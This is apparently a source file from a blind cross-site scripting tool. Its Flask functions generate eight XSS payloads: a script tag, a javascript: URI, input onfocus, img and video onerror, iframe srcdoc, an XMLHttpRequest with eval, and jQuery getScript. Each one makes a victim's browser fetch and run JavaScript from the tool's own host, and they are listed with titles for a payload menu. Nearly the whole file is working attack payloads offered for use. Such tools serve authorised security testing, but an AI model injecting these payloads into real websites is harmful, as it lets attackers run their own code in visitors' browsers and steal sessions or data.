
from flask import request

def basic_script():
    return f'<script src="{request.current_host}"></script>'

def javascript_uri():
    return f"javascript:eval('document.createElement(\"script\").src=\"{request.current_host}\"')"

def input_onfocus():
    return f"<input onfocus='document.createElement(\"script\").src=\"{request.current_host}\";'>"

def image_onerror():
    return f"<img src='x' onerror='document.createElement(\"script\").src=\"{request.current_host}\";'>"

def video_source():
    return f"<video><source onerror='document.createElement(\"script\").src=\"{request.current_host}\"'></video>"

def iframe_srcdoc():
    return f"<iframe srcdoc='<script src=\"{request.current_host}\"></script>'></iframe>"

def xmlhttprequest_load():
    return f'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{request.current_host}");a.send();</script>'

def jquery_chainload():
    return f'<script>$.getScript("{request.current_host}");</script>'

payloads = [
        {
            'func': basic_script,
            'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
            'description': 'Classic payload',
        },
        {
            'func': javascript_uri,
            'title': '<code>javascript:</code> URI Payload',
            'description': 'Link-based XSS',
        },
        {
            'func': input_onfocus,
            'title': '<code>&lt;input&gt;</code> Tag Payload',
            'description': 'HTML5 input-based payload',
        },
        {
            'func': image_onerror,
            'title': '<code>&lt;img&gt;</code> Tag Payload',
            'description': 'Image-based payload',
        },
        {
            'func': video_source,
            'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
            'description': 'Video-based payload',
        },
        {
            'func': iframe_srcdoc,
            'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
            'description': 'iframe-based payload',
        },
        {
            'func': xmlhttprequest_load,
            'title': 'XMLHttpRequest Payload',
            'description': 'Inline execution chainload payload',
        },
        {
            'func': jquery_chainload,
            'title': '<code>$.getScript()</code> (jQuery) Payload',
            'description': 'Chainload payload for sites with jQuery',
        },
    ]